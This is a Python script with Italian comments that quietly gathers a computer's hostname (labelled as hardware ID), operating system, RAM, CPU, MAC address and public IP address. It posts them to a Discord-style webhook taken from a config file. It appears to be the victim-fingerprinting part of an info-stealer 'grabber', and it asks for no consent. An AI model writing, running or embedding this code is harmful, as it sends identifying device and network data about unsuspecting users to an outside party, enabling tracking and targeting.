import requests
import subprocess
import platform
import json
import psutil

# Importa l'URL del webhook dal file di configurazione 'config'
from config import hook

# Funzione per ottenere l'indirizzo MAC dell'interfaccia di rete
def get_mac_address():
    try:
        # Determina il sistema operativo in uso
        os_name = platform.system()

        if os_name == "Windows":
            # Esegui il comando 'ipconfig' per ottenere le informazioni di rete su Windows
            output = subprocess.check_output(["ipconfig", "/all"]).decode("utf-8")
            for line in output.split("\n"):
                if "Physical Address" in line:
                    mac = line.split(":")[1].strip()
                    return mac
        elif os_name == "Linux":
            # Esegui il comando 'ifconfig' per ottenere le informazioni di rete su Linux
            output = subprocess.check_output(["ifconfig"]).decode("utf-8")
            for line in output.split("\n"):
                if "ether" in line:
                    mac = line.split(" ")[1]
                    return mac
        else:
            print("Sistema operativo non supportato")
            return None
    except Exception as e:
        # Gestisce eventuali errori
        print("Errore durante il recupero dell'indirizzo MAC:", e)
    return None

# Funzione per raccogliere e inviare le informazioni sulla macchina al webhook
def machineinfo():
    try:
        # Ottiene le informazioni sulla memoria
        mem = psutil.virtual_memory()

        # Ottiene l'ID della macchina corrente
        current_machine_id = platform.node()

        # Ottiene le informazioni sul sistema operativo
        os_info = platform.platform()

        # Ottiene le informazioni sulla CPU
        cpu_info = platform.processor()

        # Ottiene l'indirizzo MAC
        mac = get_mac_address()

        # Inizializza le informazioni sulla GPU come "N/A" (potresti doverlo cambiare per ottenere le informazioni effettive sulla GPU)
        gpu_info = "N/A"

        # Ottiene l'indirizzo IP pubblico utilizzando un servizio esterno
        reqip = requests.get("https://api.ipify.org/?format=json").json()

        # Crea un payload JSON con le informazioni raccolte
        payload = {
            "embeds": [
                {
                    "name": ":computer: PC",
                    "value": f"`{current_machine_id}`",
                    "inline": True
                },
                {
                    "name": ":desktop: OS:",
                    "value": f"`{os_info}`",
                    "inline": True
                },
                {
                    "name": ":wrench: RAM",
                    "value": f"`{mem.total / 1024**3} GB`",
                    "inline": True
                },
                {
                    "name": ":pager: GPU",
                    "value": f"`{gpu_info}`",
                    "inline": True
                },
                {
                    "name": ":zap: CPU",
                    "value": f"`{cpu_info}`",
                    "inline": True
                },
                {
                    "name": ":key: HWID",
                    "value": f"`{current_machine_id}`",
                    "inline": True
                },
                {
                    "name": ":label: MAC",
                    "value": f"`{mac}`",
                    "inline": True
                },
                {
                    "name": ":crossed_swords: IP",
                    "value": f"`{reqip['ip']}`",
                    "inline": True
                }
            ]
        }

        # Imposta l'intestazione per la richiesta HTTP
        headers = {
            "Content-Type": "application/json"  # "Application/Json" corretto in "application/json"
        }

        # Effettua una richiesta POST al webhook con il payload JSON
        r = requests.post(hook, data=json.dumps(payload), headers=headers)

        # Verifica lo stato della risposta e stampa un messaggio
        if r.status_code == 200:
            print("Dati inviati con successo")
        else:
            print("Impossibile inviare i dati")
    except Exception as e:
        # Gestisce eventuali errori
        print("Errore:", e)

# Verifica se il file è eseguito come script principale
if __name__ == "__main__":
    # Chiama la funzione per raccogliere e inviare le informazioni sulla macchina
    machineinfo()
